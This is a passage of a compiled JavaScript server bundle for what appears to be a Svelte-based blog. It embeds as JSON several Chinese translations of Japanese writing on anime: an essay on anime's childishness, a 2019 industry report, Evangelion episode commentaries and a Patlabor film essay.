'use strict';

function _interopDefault (ex) { return (ex && (typeof ex === 'object') && 'default' in ex) ? ex['default'] : ex; }

var sirv = _interopDefault(require('sirv'));
var polka = _interopDefault(require('polka'));
var compression = _interopDefault(require('compression'));
var fs = _interopDefault(require('fs'));
var path = _interopDefault(require('path'));
var Stream = _interopDefault(require('stream'));
var http = _interopDefault(require('http'));
var Url = _interopDefault(require('url'));
var https = _interopDefault(require('https'));
var zlib = _interopDefault(require('zlib'));

var Mod0 = {"title":"【譯】動畫與成人的知性","slug":"ACG-anime-and-verstand-of-adult","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://animenodanmen.blogspot.com/2015/05/blog-post.html\">https://animenodanmen.blogspot.com/2015/05/blog-post.html</a></p>\n<hr>\n<p>最近突然變得好熱哪。</p>\n<p>我認為日本動畫一直無法脫離幼兒化是件非常深刻的問題。不論是電影還是戲劇，都有穩定提供給大人的作品。動畫當然也有值得大人鑑賞的作品，但仍然難以樹立成一種路線。</p>\n<p>雖說最近電影面向大人的作品也開始減少，轉為以漫威漫畫的電影化或孩童的故事做為商業的中心，日本的動畫是以面向孩童為主製作起家的，和幼兒化密不可分也是無可奈何的。業界和面向孩童的技法親和度比較高也是理由之一。</p>\n<p>但令我非常在意的是，現在動畫的幼兒化是為了讓大人消費所做的幼兒化。當大人消費的作品幼兒化成為必然，只代表觀眾是依然幼稚的大人。並且這也不是現在才有的問題，而是近 40 年前從第一世代御宅族誕生時就存在的。</p>\n<p>粉絲長大以後仍然無法離開自己在輕少年、孩童時期所觀看的作品類型，甚至轉為成為製作者，繼續生產著同樣的東西，早已經成為現實的日常。</p>\n<p>雖說我的原始衝動也是來自於想要作出和自己在年幼時所看到的類似的作品。但成為製作者後，時代已經改變，不能再繼續製作相同的東西，以前的作品是提供給孩童看的，動畫當然是幼兒化的，但當提供給大人看的作品幼兒化也成為必然時，這種必然性會難以被普羅大眾所理解。</p>\n<p>動畫評論難以成立的理由也是如此，只要想想評論本身也是面向大人的行為，就會覺得理所當然了。</p>\n<p>這可能也和目前的娛樂仍然難以讓遊玩大人的知性成為一門生意有關。也可能只是缺乏能作出這類作品的人材。電影的熱門作品傾向也給人一種大人的知性 (至少) 在娛樂裡是非必要的印象。總地來說也不全然只有動畫在提供著幼兒性。</p>\n<p>但動畫所使用的素材，也就是繪畫，會更為強調幼兒性。或許體現幼兒性的大眼睛角色對孩童而言有著做為容易融入故事的角色必然性，那麼大人也在追求大眼睛的角色的理由又是什麼呢。是愛惜孩童的視角能帶來愉悅嗎？在動畫的初期設定做出大眼睛的角色時，若故事缺乏大人的知性，大人仍然是難以接受的吧。而當故事也具有大人的知性時，我認為故事要求角色的外形表現裡，也不存在大眼睛的必然性。但現在即使是具有大人知性的故事，也鮮少有放棄大眼睛角色的作品。我覺得這背後理由是很複雜的。</p>\n<p>其中主要的理由，或許是這已經形成了一種，只有喜好大眼睛角色的人，才會沉浸於動畫、漫畫世界裡的，類似門檻或通行証的機能。曾經風靡一時的大友克洋的眼睛大小則決不會成為主流。我認為若不對動畫所持有的幼兒性時常抱持著其作為武器的自覺，是非常危險的。如何處置幼兒性，會是動畫要如何取得如戲劇或電影的社會地位時非常重要的課題。若只是以因為現在這樣能賣得好當成理由，而輕易地向其靠攏，或許之後將會迎來無法挽回的事態。</p>\n","date":"2020-07-05T21:36:18.000Z","excerpt":"","printDate":"July 5, 2020","printReadingTime":"1 min read"};

var route_26 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod0
});

var Mod1 = {"title":"【譯】動畫產業報告 2019","slug":"ACG-anime-report-2019","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://aja.gr.jp/jigyou/chousa/sangyo_toukei\">https://aja.gr.jp/jigyou/chousa/sangyo_toukei</a></p>\n<hr>\n<h2 id=\"即使-2018-年再次刷新了成長率最高值，其原動力的海外市場的成長開始鈍化\">即使 2018 年再次刷新了成長率最高值，其原動力的海外市場的成長開始鈍化</h2>\n<p>雖然動畫產業市場自 2010 年起連續 9 年不斷成長，並連續 6 年刷新了最高值，但 2018 年因為怒濤氣勢的海外市場成長（2015 年 178.7%，2016 年 131.6%，2017 年 129.6%）失速（101.4%），相較前一年相比成長率僅剩 100.9%。而連續 3 年減少的國內市場則有些許的回復（相較前年 100.4%）。</p>\n<h2 id=\"急速成長的動畫產業市場失勢\">急速成長的動畫產業市場失勢</h2>\n<p>雖然 2018 年的動畫產業市場更新了過去的成長記錄 [圖表 1]，但相較前年 100.9% 的這個數字即使轉為負成長也是有可能的。相較前一年成長的有電視 107.0%（去年的相比前年為 100.9%）、電影 103.9%（同 61.8%）、串流 110.2%（同 113.0%）、音樂 104.1%）同 93.2%，但 2018 年開始加入數位串流的收入才會比前一年高，實體商品相比前年為 98.6%）、海外 101.4%（同 129.6%）、博奕 105.5%（同 95.4%）、現場娛樂活動 123.1%（同 118.2%）。另一方面減少的為 光碟 76.7%（同 97.1%）、商品化權利 95.6%（同 93.0%）。金額面上是因為光碟（-178 億日圓） 和商品化權利（-229 億日圓） 的市場大幅減少，由博奕（+148 億日圓）和海外（+144 億日圓） 市場為中心彌補整體的缺口，但從整體看來無法否認這數年的急速成長已經開始失勢。</p>\n<h2 id=\"2016-年～-2017-年動畫產業界的焦點\">2016 年～ 2017 年動畫產業界的焦點</h2>\n<h3 id=\"＜海外市場開始失勢？＞\">＜海外市場開始失勢？＞</h3>\n<p>從 [圖表 2] 裡國內和海外的動畫市場比較裡能看出，雖然在 2013 年曾經來到最大 9116 億日圓的差額，之後便急速拉近在 2017 年變為 1728 億日圓。從近年的海外市場成長率來看（15 年的前年比 178.7%，16 年同 131.6%，17 年同 129.6%），18 年有相當大的可能性國內海外市場成長率會逆轉，然而海外市場僅增加了 144 億日圓（101.4%），並未反超些許增加的國內市場（46 億日圓/100.4%）。那麼，為何 18 年海外市場會開始失勢？</p>\n<p>這能從許多業界人士的證言裡推測出，一大原因是中國市場的減速。眾所皆知中國對於媒體內容的表現管制相當嚴格，但至今為止對於網路方面是比較寬鬆的。直到網路內容的影響力加大，便開始受到與既有媒體同樣的規範，要求網路內容也得遵守原是面對電影、電視節目這類既有媒體的審查制度，因此，即使規範正式上路是在 2019 年 4 月之後，對於規範的不信任感已經先顯現在 2018 年中期的買氣上了。</p>\n<h3 id=\"＜正式進入轉換期的動畫視口\">＜正式進入轉換期的動畫視口&gt;</h3>\n<p>2018 年特別明顯的是影音出版業的凋零。現今動畫產業市場的 9 大項目（亦稱為業別、視口）裡 [圖表 3]，有 7 項是自開始統計時的 2002 年就存在的，分別是 TV、電影、光碟、串流、商品化、音樂、海外，而串流是自 2002 年後才開始統計，因此實際上最初僅有 6 種項目。直到 2009 年加入博奕、2013 年加入現場活動。動畫產業市場的類別會不斷變化、經歷盛衰。現今代表「盛」的便是串流、現場活動，而「衰」就是光碟了。這是環繞於「數位」這個關鍵字所發生的現象 (因此十分要求高黏著度 direct media 的現場活動有所成長這點也很有意思)，可以預測往後「數位商品化」（目前的商品化並未計入數位化的商材）或是以動畫為題的「網路遊戲」（既有的實體平台遊戲計入於商品化裡）有可能會獨立成為新的項目，而光碟＝影音出版業這一項目則會消失。動畫的經濟漣漪效果是時常在變化著的。</p>\n<h3 id=\"＜創下史上第二高制作分鐘數的-2018-年＞\">＜創下史上第二高制作分鐘數的 2018 年＞</h3>\n<p>過去普遍認為電視動畫大國的日本，制作的總時間數實際上影響著業界的的景氣動向，而 2018 年相比前年成長了 112.9% 到達了史上第 2 的 130808 分鐘 [圖表 4]。所增加的 14968 分鐘約略為 10 部一年播放 50 話每集 30 分鐘的節目量。其中仍不包含如 Netflix 之類的串流原創作品，若將這些作品一同計入電視動畫的項目裡，或許有可能會超越史上第 1 的 2006 年的 136407 分鐘。出現這種大幅提升的直接原因，有可能是因為應對更多動畫的需求所出現的新作品而增加的制作分數，亦或是因為制作工程數位化導致生產性的提升，雖然無法判斷主因為何但可能兩者皆是。</p>\n<p>雖然 2018 年成了逼近史上最高記錄的一年，但這年並沒有出現如 2006 年時品質下滑的狀況。沒有一股腦地將工作推到海外，而能維持整體作品品質這點雖然值得讚賞，但也因此出現了延後播放這類的現象。是否會以 2018 年為起點，往後制作分數會再往上，亦或到了這個等級已經是極限數值，我們只能繼續觀望往後的演變。</p>\n<h3 id=\"＜美國動畫的新浪潮～『蜘蛛人：新宇宙』＞\">＜美國動畫的新浪潮～『蜘蛛人：新宇宙』＞</h3>\n<p>根據 BOX OFFICE 的統計，2018 年美國制作的動畫在北美創下了總計相比前年成長至 113.8% 的 16 億 3901 萬美元的成績。皮克斯／迪士尼佔有整體工作室佔比壓倒性的 49.4%，照明娛樂佔 16.5%，成功於一年內推出 3 部作品的索尼動畫佔 21.8%，結果上這 3 間公司佔了總計的 88.7%，而其中特別值得一提的便是索尼的『蜘蛛人：新宇宙』。對於這部索尼首次獲得奧斯卡最佳動畫片賞（也在其它的電影獎項獲得壓倒性的勝利）的作品，富野由悠季導演評論道「從美國的電影人眼裡看來，這部作品是對美國的電影人來說，首部在普通的劇院裡上映『不是給小孩子看』的動畫」，這對日本的動畫產業有著非常重大的意義。因為這代表了好萊屋進攻了原本由日本所獨佔的成人／青年動畫的領域。若是好萊屋認真地走向這個方向，日本製動畫的存在意義也會出現動搖吧。</p>\n<h3 id=\"＜中國出現驚人的百萬大作，這能再次帶來投資熱潮嗎？＞\">＜中國出現驚人的百萬大作，這能再次帶來投資熱潮嗎？＞</h3>\n<p>中國的電影動畫從 2016 年開始收入便大幅減少，直到要迎來 2019 仍無法望見未來，此時出現了一舉改變現況的作品。那就是『哪吒之魔童降世（Ne Zha）』。於暑假上映的這部 3D 動畫票房出現驚異速度的成長，輕鬆地超越了中國國產動畫歷史上票房最高的『西遊記 Hero is Back』（9.57 億人民幣／153 億日元），甚至也超越了動畫歷史第 1 的『動物方程市』（15.33 億人民幣／245 億日元，成為中國電影史上第二 50 億人民幣（800 億日元）的百萬大作，刷新了個別國家裡動畫票房收入世界紀錄的『超人特攻隊 2』的成績。相信這會成為自『西遊記 Hero is Back』之後新一波的製作投資風潮，加速中國動畫產業的成長。同時這也可能使得中國開始遠離日本動畫。從本作的導演可以看出，許多深受日本漫畫、動畫、遊戲影響，於 1980 年代出生的 80 後（於 80 年代出生的新人類）創作者已經吸收了足夠的日本文化，並擁有能將其以自我風格表現出來的技術。在出現這樣世代的中國是否仍有繼續和日本合作的必要。值得我們繼續觀察。</p>\n<h2 id=\"廣義上的動畫產業市場項目定義\">廣義上的動畫產業市場項目定義</h2>\n<ol>\n<li>TV: 電視台的動畫關相關銷量（節目製作費、媒體費、販賣費）總計</li>\n<li>電影: 電影動畫的票房總計</li>\n<li>光碟: 動畫光碟的銷量總計</li>\n<li>串流: 影音串流平台的動畫串流銷量總計</li>\n<li>商品化: 動畫相關產商品（除去數位商品）的銷量總計</li>\n<li>音樂: 動畫相關音樂 CD、音樂串流（於 2008 年開始計入）的銷量總計</li>\n<li>海外: 於海外的動畫相關消費（播放、上映、光碟、串流、商品等等）的總計</li>\n<li>博奕: 使用動畫作品為題材的帕青哥、Slot 的出租機台推算值總計</li>\n<li>現場活動: 動畫相關的演唱會、活動、2.5 次元音樂會、轉播、音樂會、展覽會、咖啡廳等等的銷量總計</li>\n</ol>\n<h2 id=\"狹義上的動畫業界市場項目定義\">狹義上的動畫業界市場項目定義</h2>\n<ol>\n<li>TV: 製作、制作公司於電視動畫製作銷量、動畫作品播映收入獲得的配額總計</li>\n<li>電影: 製作、制作公司於電影動畫製作銷量、票房收入獲得的配額總計</li>\n<li>光碟: 製作、制作公司所制作的 OVA 銷量、動畫光碟收入的配額總計</li>\n<li>串流: 製作、制作公司於串流動畫製作銷量、串流收入獲得的配額總計</li>\n<li>商品化: 製作、制作公司於商品化、廣告促銷、活動所獲得的授權收入配額總計</li>\n<li>音樂: 製作、制作公司於相關音樂 CD、音樂串流（於 2008 年開始計入）獲得的收入配額總計</li>\n<li>海外: 製作、制作公司於於海外的動畫相關消費（販賣影像、商品化等海外面向的授權收入）的總計</li>\n<li>博奕: 製作、制作公司制作的帕青哥、Slot 影像銷售、授權收入配額的總計</li>\n<li>現場活動: 製作、制作公司的現場活動相關授權的收入配額總計</li>\n<li>其它: 不屬於上述項目的製作、制作公司的收入總計</li>\n</ol>\n","date":"2020-04-21T19:24:01.000Z","excerpt":"","printDate":"April 21, 2020","printReadingTime":"2 min read"};

var route_41 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod1
});

var Mod2 = {"title":"【譯】アニメ様的七嘴八舌 第 58 回 EVA 雜記 「第二十五話 結束的世界」","slug":"ACG-animesama-58-eva-end-of-world","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"http://style.fm/as/05_column/animesama58.shtml\">第 58 回　エヴァ雑記「第弐拾伍話　終わる世界」</a></p>\n<hr>\n<p>我記得那是 1996 年的 1 月的事吧，有場《EVA》LD 解說書的製作人員的酒會。當時 GAINAX 的人，為我們說明第二十五和最後一話是什麼樣的內容。那是我們第一次知道最後 2 話的內容。當時聽到的說明是，主要的角色會接連登場於畫面上，談論為什麼那人必須被補完。也就是這些角色們，都是為了證明人類是不完整的存在的範本。已經酒過三巡的我們說道「又來了，是在開玩笑吧」，並沒有太當真。</p>\n<p>我還記得很清楚，在看「第二十五話 結束的世界」時的事情。當時我和幾原邦彥導演正在推進《少女革命》的準備，已經開好了《少革》的製作空間——ビーパパス工作室。第二十五話開播時是在ビーパパス工作室和大家一起看的。看了第二十五話，我們都非常的興奮。裡頭使所用的前衛手法與影像的高揚情緒，以及不曉得接下來會再發生什麼的有趣感，令我們深深動容。「不曉得下來會再發生什麼」這句話雖然我很常講，會在看過動畫後這樣想的，大概這集第二十五話是第一次，也是最後一次了。當然，我也理解看了這話的粉絲們會感到困惑吧。</p>\n<p>實際的「第二十五話 結束的世界」的內容，和在酒會上聽到的有些不同。真嗣、明日香、零、美里的內在宇宙的描寫佔了本篇的九成以上，幾乎沒有現實世界的描寫。在 A 段裡真嗣、零、明日香談論自己的存在意義，並自曝出內心的軟弱。B 段裡則是顯露出美里、明日香、真嗣的內心黑暗。英文副標的「Do you love me?」。是從安得烈連恩 (R. D. Laing) 的著作「DO YOU LOVE ME?」標題引用而來。「DO YOU LOVE ME?」也是一部以對話形式撰寫的作品，可以說是非常適合這話的標題。</p>\n<p>在 A 段的最後，源堂出現在零的前面，並告訴她「走吧，你就是為了今天，為了這天存在這裡的，零。」B 段開頭透過台詞和字幕告知人類補完計畫發動了。只要人心有著喪失的部份，就永遠無法在活著的時候將那份黑暗抹去。所以，要將所有人的心合而為一，彼此互相填補。並且獲得永遠的安寧。這就是補完計畫。其理念在劇中也有說明。</p>\n<p>內在宇宙描寫花費最多心力的，就是美里的部份。劇中描寫了她對雙親的想法、試圖當個好孩子的理由、為何與加持睡覺的理由。其中一部份在前面的故事章節也有提及過，在本集裡則變得更加赤裸。分鏡稿裡美里的段落更長，有幾段被刪除的部份。有興趣的人可以去找出版的分鏡稿集來看。刻畫活生生的人，尤其是刻畫活生生的女性，是『EVA』演出的主題。這段可以說是『EVA』刻畫人類的終點吧。也是不斷問著「美里究竟是位什麼樣的女性」這個疑問的最終解答。雖然那是個沒什麼夢想的解答。</p>\n<p>庵野導演自己也說明過《EVA》的尾段是「多重結局」，《EVA》以「第二十四話 最後的使者」的結束做為分歧點，讓故事分向兩條路線，朝向不同的結局。第二十五話和最終話是一個結局，之後所製作的重製版第 25 話和第 26 話是另一個結局。</p>\n<p>雖然在第二十五話裡說明了人類補完計畫的理念，但並不曉得其具體是如何執行的。並且也沒有說明源堂和 SEELE 之間的關係。在第二十五話裡，有著二號機泡在水裡抱著膝蓋的 CUT、飄浮在 LCL 上被槍擊中的律子的 CUT、倒在地上被槍擊中的美里的 CUT。這些並不是角色內在宇宙的描寫，而是故事裡的現實。其機制是要看了「第 25 話 Air」才能瞭解為什麼會發生這樣的事情。</p>\n<p>比較過第二十五話和最終話、以及第 25 話和第 26 話，可以知道真嗣內心的糾葛、主題的處理方式幾乎是一樣的。第二十五話和最終話捨棄了戲劇面的設定與說明，僅描寫了主題。而第 25 話和第 26 話描寫同樣的主題並保留有戲劇設定和說明。看了第 25 話和第 26 話，就能理解第二十五話和最終話裡究竟發生了什麼吧。</p>\n<p>雖然我剛剛寫了「第二十五話和最終話是第一個結局」，但我覺得「第二十五話 結束的世界」後續並不是「最終話 在世界的中心呼喊愛的野獸」，而是這兩話各自都是最終回。也就是第一個結局是第二十五話，第二個結局是最終話，第三個結局則是第 25 話和第 26 話。在第二十五話的最後，我們能夠知道那就是真嗣所期望的世界。真嗣為了保護自己脆弱的心，渴求能將厭煩的東西排除的世界。裡頭也有談到「這個形式也是結局之一」「這是你所導向的世界的結束」。副標也是如其內容的「結束的世界」。</p>\n<p>然而在「最終話 在世界的中心呼喊愛的野獸」裡的真嗣，再次苦惱於「自己的存在價值」與「厭惡的事」。若真嗣在第二十五話裡渴求排除厭煩事物處於孤獨世界。為什麼在最終話裡仍在苦惱同樣的事情呢。真嗣渴望世界結束，並在第二十五話的最後被其他角色所苛責，這在情緒上和有些悠然的最終話也無法連接。我們能從一開始「時值 西元 2006 年」的場景得知，最終話是第二十五話隔年的故事。如果最終話裡所描寫的，已經是所有人的心都合而為一的世界裡所發生的事，那麼也能認為是真嗣的糾葛再次 reset 了吧。</p>\n<p>如果第二十五話的收尾是結局之一，那會是三個結局裡最糟糕的結局。但是那能連接起第二十四話前的情緒。並且那種深刻痛苦的結束方式也不賴。</p>\n","date":"2019-01-19T06:44:13.000Z","excerpt":"","printDate":"January 19, 2019","printReadingTime":"1 min read"};

var route_22 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod2
});

var Mod3 = {"title":"【譯】アニメ様的七嘴八舌 第 59 回 EVA 雜記 「第二十六話 在世界的中心呼喊愛的野獸」","slug":"ACG-animesama-59-eva-monster-shout-for-love-in-the-center-of-world","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"http://style.fm/as/05_column/animesama59.shtml\">第 59 回　エヴァ雑記「最終話　世界の中心でアイを叫んだけもの」</a></p>\n<hr>\n<p>雖然第貳拾伍話和最終話在主題上相當充實，可說是份充滿野心的影像，但放棄了戲劇應有的樣貌也是事實。許多在劇中所提到的謎團並沒有得到解答。實際上也有許多粉絲對這最後 2 話感到不滿。</p>\n<p>在談論《EVA》的創作者和作品的關係，以及作品和粉絲之間的關係時，使用像「同步率」或「補完」這種劇中的用語是有效的，這件事可說十分有趣。創作者將自己的內心景色和嗜好投射到作品上，並讓作品和粉絲同步。也就是透過作品，讓粉絲和作者的內心深處同步。這樣的構造也存在於當時《EVA》的人氣裡頭。當然我也是那同步的粉絲其中一人。</p>\n<p>而若「補完」是填平內心缺陷的作業，《EVA》便是部補完粉絲內心的作品。雖然可能不僅限於《EVA》，所有的娛樂都是為了埋平內心的缺陷而存在的。《EVA》以劇情、角色和影像的魅力，補完了粉絲們的心。創作者卻在第貳拾伍話和最終話裡，對粉絲們潑了冷水。粉絲們感到憤怒，只能將這股無所適從的情緒，轉向尋求『EVA』的遊戲、週邊商品、二次創作。正是因為過高的同步率，才出現了這樣大的反彈。即使要說套上補完的概念不完全恰當，動畫版迎來了那樣的結局，肯定也是讓《EVA》風潮加速的原因。而從旁觀的視角來看，劇中補完計畫的發動，卻使得粉絲內心的缺陷更加擴大。也是《EVA》所創造出最大的諷刺。</p>\n<p>在電視版播放結束後，庵野導演在雜誌和電台節目裡對於第貳拾伍話和最終話做過評論。在當時 Animage 的取材記事裡提到，開始厭惡依賴於動畫上的粉絲；第貳拾伍話和最終話是為了潑冷水所做的，一半是潑向觀眾，一半是潑向自己。透過製作出那段結局，知道自己的心情也十分惡劣，才同時對自己潑了水。庵野導演也說過，「回歸現實」也是最後 2 話的主題，他在當時的電台節目裡做過同樣的發言。</p>\n<p>在最終話的後半段裡所說的「或許也存在著這樣的世界」，俗稱的「校園 EVA」的 PART，原本是含有「反正你們想看的，就是這樣的東西吧」的，作者牢騷的意味，卻被粉絲們連同當成自己的嗜好品消費。而創作者雖然發著牢騷，看來也是十分享受著「校園 EVA」。這樣的矛盾也非常有《EVA》的感覺。創造出讓粉絲沉溺其中的影像，再說出「回到現實」，這種事本身就相當矛盾，但產生出這樣的矛盾，也正是《EVA》會是《EVA》的原因。</p>\n<p>最終話的副標是「在世界的中心呼喊愛的野獸」。根據庵野導演作品的傳統，最終話的副標都會採用 SF 小說標題，可以認為這是取用自哈蘭．艾里森的著書《在世界的中心呼喚愛的野獸》。而「愛」再搭上英文的「I」，也就是在世界的中心裡呼喊著「我就在這裡」的意思。故事接續前一話，繼續談論著真嗣一行人們的內心宇宙。並用上了真人照片、翻紙動畫，連這一話的配音腳本都出現在作品裡。描寫上比第貳拾伍話更為前衛，但因為是真嗣得到救贖的故事，緊張感並沒有前一話那麼高。</p>\n<p>無法找出自身價值的真嗣，持續和許多人物對話著。時間總在流動著，世界是由一連串的變化而來的。而如何變化，是由自己的心所決定。在自我之中也有許多的可能性。有可能成為「不是現在的自己」的自己。走到糾葛盡頭的真嗣，認同了自己的存在，認為自己可以存在這裡。這瞬間原本昏暗的世界，轉變成了一片藍天與藍海，其他的角色接連出現，對真嗣說道「恭喜你」。</p>\n<hr>\n<p>但在所有人的心合而為一的世界裡，即使肯定了自己，又有什麼用處呢。名為自我的個體不是已經消失了嗎。亦或是主角被其他人強迫矯正，那又能稱得上是最終回嗎。如果最終話是第貳拾伍話的後續，那會是由真嗣所造就的「這個世界的盡頭」裡所發生的事。在其他角色拍手的畫面裡，他們腳下的地球，大陸已然消失，並由巨大的珊瑚群所取代。或許那就是第三次衝擊之後的世界。已經沒有身為人類能夠存活的場所，那還能稱得上是 HAPPY END 嗎。當然，要如何去解讀這段收尾方式，判斷交到了每位粉絲的手上。就像這話裡加持所說的「有多少人，就有多少種真實」。只是對我而言，我認為「恭喜你」這句台詞是非常偽善的。</p>\n<p>或者是將《新世紀福音戰士》至今為此的故事切割開來，將後半的問答簡易地當成對動畫粉絲所說的訊息來思考。創作者想說的並不是「可以待在這裡也沒關係」，而是在那之前的「你所相信的世界，是由自己所創造出的狹小的世界」的部份。自己認為是真實的事，是劍介說的「由狹小的世界觀所造就的，為了保護自己而改造過的資訊。被扭曲過的真實」。所以，回到現實吧。不過這以傳達訊息的對象來說，態度又太過溫柔。反而讓人怪不舒服的。簡直就像是在對著嬰兒說話一樣。</p>\n<p>在最後出現「向父親道謝」、「向母親告別」、「以及，給所有的孩子們 (children)」、「恭喜你」的字卡，電視動畫版就此落幕。如果《EVA》是伊底帕斯情結的故事，「向父親…」、「向母親…」的部份，就能解釋為尋求母親、憎恨父親的真嗣，克服了這份糾葛，和父親和解、離開了母親。「以及給所有的孩子們…」的部份，則是這個世界，是值得我們活下去的美好場所，祝福你於這個世上的誕生吧。標題的「Evangelion」，正是福音的意思。</p>\n<p>真嗣所得出的結論是，知道自己創造出的世界的狹小，但自己還是可以待在這裡。如果這樣微小的幸福對我們而言是福音的話，那倒也是件十分寂寞的事哪。</p>\n","date":"2020-05-10T19:37:05.000Z","excerpt":"","printDate":"May 10, 2020","printReadingTime":"1 min read"};

var route_1 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod3
});

var Mod4 = {"title":"【譯】《機動警察 the Movie》和「東京」的創造與破壞――身為浪漫主義者的帆場暎一","slug":"ACG-creation-and-destroy-of-tokyo-patlabor-movie-1","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"http://amberfeb.hatenablog.com/entry/2014/08/17/222326\">『機動警察パトレイバー the Movie』と「東京」の創造と破壊――ロマンチストとしての帆場暎一</a></p>\n<hr>\n<p>盂蘭盆節已經結束，夏季就要迎來尾聲。總是會有幾部一到夏天就想看的電影，對我來說《機動警察 the Movie》就是這類電影中的首選。已經不記得究竟看過了幾次，今天慵懶地再看了一次後，想簡單地寫點心得。</p>\n<h2 id=\"娛樂與不會被其回收的「風情」\">娛樂與不會被其回收的「風情」</h2>\n<p>每次重看《機動警察 the Movie》時我總覺得，以娛樂作品來說這真是完美。警察追查著自殺的天才程式工程師帆場暎一陰謀的懸疑要素非常有趣，颱風襲來的精彩場面、在「方舟」裡 Patlabot 的動作戲…。甚至會令人覺得，在押井守執導的作品中竟然會有這麼正統的娛樂作品？即使只是循著故事看著畫面都能十分享受於其中。</p>\n<p>當然其中也有並不只單純歸於娛樂的魅力。我認為能以「風情」一詞來總括。</p>\n<p>「風情」的其中一種面相，就是環繞在作品整體上的季節感。受到懲處的遊馬在繁夫家中進行推理的場景真的很有夏天的感覺，我非常地喜歡。而這種於一角中表露出的夏天感，發揮了成為之後颱風襲擊東京的盛大場面的伏筆功能，這點也相當出色。颱風也帶有季節感，我相信每當颱風來時，並不是只有我會想起這部電影。</p>\n<p>在充滿這種季節感風情的本作中，最為被強調的「風情」，我想就是「古老而美好的東京」了。並且這點也繼承到下部作品《機動警察 2 the Movie》裡的東京的變化，可說是做為貫穿電影版 Patlabor 的縱貫線般的明確存在。</p>\n<h2 id=\"從逐漸變化的「東京」感受到的鄉愁\">從逐漸變化的「東京」感受到的鄉愁</h2>\n<p>在劇中，有數幕松井刑事與部下片岡追循著帆場的足跡，走遍東京老舊的場景插入令人印象深刻。在第一次看的時候，我只是呆然地看著這段畫面，現在這段松井刑事下鄉，已經令我喜歡到覺得，這或許是《機動警察 the Movie》之中最有魅力的部份。</p>\n<p>帆場所居住的公寓，都是整體上十分破亂，似乎馬上就會倒塌，或是已經在拆除中的建築物。而浮現於此的，大都市東京的另一張臉龐。如今已經化為古朽的廢墟，遭到破壞。</p>\n<p>最後松井刑事向後藤隊長報告的台詞中，也帶有一層對於逐漸變化的東京，無法言喻的鄉愁。</p>\n<blockquote>\n<p>後藤「耶和華又使天下垂，親自降臨，有黑雲在他腳下。這是舊約聖經詩篇。可以認為這是帆場本人所寫的東西沒錯。不過真虧你能找到帆場本人的住家啊。」</p>\n<p>松井「只是照著搬家的路徑回頭找而已啦。不過這樣也就結束了，Dead End。那片區域是在 80 年代房價飆漲時，因為出售土地而毀滅的城鎮的一部份。在之後的國土法制定什麼的都沒能得到活用，也就是片無人問津的土地。</p>\n<p>不過這還真是奇妙的城鎮哪。在追尋著他的過去時，讓我有種像是停留在已逝時光裡的感受。那些原本熟悉的風景腐朽凋零化為廢墟，在轉眼間就消失殆盡。快速得連思考這有什麼意義的餘裕都沒有。或許在這裡所謂的過去是一文不值的吧。」</p>\n<p>後藤「我們在這裡對話所處的地點，在不久之前也只是一片海洋。在幾年之後，眼前的這片大海就會化為巨大的街道。而那也會在轉眼間，變成一文不值的過去。就像是種惡劣的玩笑。或許這就是帆場想讓我們看的東西吧」</p>\n</blockquote>\n<p>曾經存在的事物，消逝於轉瞬間。許多人們追著這速度，或者說是無法避免地被，這速度帶著走地過著日子。然而注意到這驚人而無能為力的速度的男子，對其感到惶恐，也因此決心必須要挺身對抗它吧。將這種人物側寫，托附給帆場暎一這名於作品中不自述的犯罪者，是否是能被允許的呢。</p>\n<p>帆場是名過激的復古主義者嗎。若要這樣問的話也不是如此。在猛烈速度變化著的東京這份現實裡，位於逐漸被割捨掉的前端活著的帆場，很可惜地他並沒有明確地想要取回的過去的樣貌。而只能夠地一味地懷念著逐漸消失的東京。也因此，帆場無從自述，無話可說，在目睹自己的完全犯罪達成之前，選擇了死亡。</p>\n<p>但是，在作品中帆場引用了如「巴比倫之塔」或是「方舟」這類的聖經概念。因此可以說在作品中裡也表示了，我所說的帆場暎一的人物側寫是錯誤的。這是後藤隊長的推理。</p>\n<blockquote>\n<p>後藤「忍小姐啊我認為呢。我覺得我終於瞭解了，帆場這個男人的想法。他是在那些日子裡，從房間的窗戶仰望著高樓大廈，如何盤算著犯罪。耶和華降臨要看看世人所建造的城和塔。我們下去，在那裏變亂他們的口音，使他們的言語，彼此不通。所以那城名叫巴別。」</p>\n<p>南雲「那也有可能是巧合吧」</p>\n<p>後藤「帆場將自己的臨死之所選在方舟也是巧合嗎。如果一切都是依照聖經所策略的計畫，巴比倫計畫是不可能不在他的目標內的，災難的巴比倫，他一切雕刻的神像都打碎於地。要舉例的話還有很多證據，這是他刻意留下的訊息。例如說，帆場待過的 26 個地方，與遊馬所發現的三個失控事件頻傳的地區重疊。松井也覺得這很不可思議，就像是要我們去解開謎題般的手法。他可不是什麼浪漫的男人。只是從一開始就沒把警察放在眼裡。對於自己的程式有著絕大的自信。不然就不會在看到結果之前就自殺了。或許他是一邊對我們，不，一邊嘲笑著住在這個城市裡的所有人，一邊跳下海的」</p>\n</blockquote>\n<p>在後藤的推測中，他認為帆場是模仿聖經進行自己的犯罪，是有確實犯意的犯罪者。毫不在意對於東京的鄉愁，（先不論對話上的文脈）甚至以「他不是那麼浪漫的男人」果斷地否定。</p>\n<p>雖說如此，在缺乏帆場的自述下，後藤的推理也只能做為其中一種說法。要從帆場暎一這個零記號裡讀出些什麼的，這份自由被交到了身為解讀者的我們手上。或許這樣來看，我所認為的「懷念著古老美好的東京的浪漫主義者」的帆場暎一，也是能夠被允許的吧。</p>\n<p>而身為懷舊愛好者的帆場的，這種人物側寫，與作品中反複出現的聖經意像也絕不是矛盾的。不只是不矛盾，甚至可說是十分契合。經歷過 1980 